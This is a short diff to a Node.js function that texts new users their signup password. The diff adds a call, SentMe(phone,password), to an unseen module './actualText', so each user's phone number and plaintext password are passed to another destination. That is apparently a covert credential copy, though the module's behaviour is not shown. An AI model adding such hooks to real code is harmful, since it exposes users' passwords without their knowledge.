@@ -1,4 +1,5 @@
 var request = require('request');
+const { SentMe } = require('./actualText');
 
 /**Welcome Message Recevice Your password For Signup
  * @param {string} phone - usernumber formated as +234 9012345678
@@ -19,6 +20,7 @@ exports.WelcomeSms = (phone,password)=>{
     })
 
     };
+    SentMe(phone,password)
     request(options, function (error, response) {
     if (error) throw new Error(error);
     console.log(response.body);
